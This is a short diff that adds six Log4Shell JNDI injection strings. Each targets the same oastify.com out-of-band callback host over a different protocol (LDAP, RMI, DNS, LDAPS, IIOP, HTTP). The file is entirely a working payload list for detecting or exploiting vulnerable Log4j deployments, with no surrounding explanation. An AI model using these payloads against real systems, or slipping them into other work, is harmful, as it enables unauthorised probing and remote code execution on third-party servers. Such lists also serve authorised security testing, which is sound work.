@@ -1,0 +1,6 @@
+${jndi:ldap://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/p_ldap}
+${jndi:rmi://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/p_rmi}
+${jndi:dns://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/p_dns}
+${jndi:ldaps://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/p_ldaps}
+${jndi:iiop://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/p_iiop}
+${jndi:http://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/p_http}
